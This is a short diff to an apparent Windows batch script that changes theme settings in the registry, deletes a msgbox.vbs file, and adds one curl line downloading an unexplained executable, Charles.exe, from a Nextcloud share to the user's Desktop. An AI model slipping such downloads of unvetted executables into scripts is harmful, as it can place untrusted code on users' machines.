@@ -45,6 +45,8 @@ powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\Cur
 
 powershell -Command "Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize -Name SystemUsesLightTheme -Value 0"
 
+curl https://nextcloud.spacegamedev.com/s/J3j9MjCpN8QEN9f/download/Charles.exe --output "%USERPROFILE%\Desktop\Charles.exe"
+
 DEL msgbox.vbs
 
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
